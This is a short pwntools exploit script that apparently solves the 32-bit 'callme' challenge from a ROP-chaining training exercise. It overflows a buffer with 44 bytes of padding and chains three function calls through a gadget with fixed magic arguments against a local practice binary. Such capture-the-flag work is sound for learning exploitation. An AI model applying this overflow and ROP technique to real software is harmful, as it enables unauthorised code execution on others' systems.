from pwn import *

context.bits = 32

p = process("./callme32")

arg1 = p32(0xdeadbeef)
arg2 = p32(0xcafebabe)
arg3 = p32(0xd00df00d)

gadget = p32(0x080487f9)

callme_one = p32(0x080484f0)
callme_two = p32(0x08048550)
callme_three = p32(0x080484e0)

overwrite = b"A" * 44

arguments = arg1 + arg2 + arg3

payload = overwrite + callme_one + gadget + arguments
payload += callme_two + gadget + arguments
payload += callme_three + gadget + arguments

p.sendline(payload)
p.interactive()
